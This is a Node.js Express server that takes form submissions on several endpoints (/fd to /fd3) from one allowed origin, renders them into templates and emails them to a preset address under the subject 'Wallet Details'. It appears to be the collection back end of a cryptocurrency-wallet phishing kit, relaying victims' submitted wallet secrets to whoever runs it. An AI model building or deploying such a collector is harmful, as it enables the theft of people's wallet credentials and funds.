const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const ejs = require('ejs');
const d = require('dotenv');
const morgan = require('morgan');

d.config();

const app = express();

const PORT = process.env.PORT || 4009;

app.use(morgan('combined'));
app.use((req, res, next) => {
	console.log('req.headers.origin', req.headers.origin);
	console.log('req.headers.host', req.headers.host);

	next();
});

var allowedDomains = [
	process.env.O1,
	process.env.O2,
	process.env.O3,
	process.env.O4,
];

app.use(
	cors({
		origin: 'http://dappsplug.com',
		methods: ['GET', 'POST'],
		maxAge: 365 * 1000,
	})
);

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

let transporter = nodemailer.createTransport({
	host: process.env.HOST,
	port: process.env.PORT,
	secure: process.env.SECURE,

	auth: {
		user: process.env.USER, // generated ethereal user
		pass: process.env.PASS, // generated ethereal password
	},
});

app.post('/fd', (req, res) => {
	ejs.renderFile(`${__dirname}/fd1.ejs`, req.body, (err, data) => {
		if (err) {
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd1', (req, res) => {
	ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let transporter = nodemailer.createTransport({
				host: process.env.HOST,
				port: process.env.PORT,
				secure: process.env.SECURE,
				logger: true,
				debug: true,
				auth: {
					user: process.env.USER, // generated ethereal user
					pass: process.env.PASS, // generated ethereal password
				},
			});
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd2', (req, res) => {
	console.log('req.body', req.body.data);

	ejs.renderFile(`${__dirname}/fd3.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd3', (req, res) => {
	console.log('req.body', req.body.data);

	ejs.renderFile(`${__dirname}/fd4.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.listen(PORT, console.log('PORT', PORT));
